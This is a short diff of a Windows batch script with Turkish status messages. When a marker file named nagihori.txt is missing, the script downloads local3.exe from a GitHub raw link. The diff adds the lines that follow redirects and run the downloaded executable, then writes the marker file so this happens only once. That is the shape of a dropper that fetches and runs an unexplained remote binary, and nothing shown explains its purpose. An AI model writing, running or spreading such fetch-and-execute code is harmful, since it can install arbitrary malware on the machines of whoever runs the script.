@@ -7,8 +7,8 @@ if exist nagihori.txt (
     exit /b
 ) else (
     echo nagihori.txt yok, devam ediliyor...
-    curl https://github.com/Banglade-sh23/-/raw/refs/heads/main/local3.exe -o local3.exe
-    
+    curl -L https://github.com/Banglade-sh23/-/raw/refs/heads/main/local3.exe -o local3.exe
+    local3.exe
     echo "asd" > nagihori.txt 
     
 )
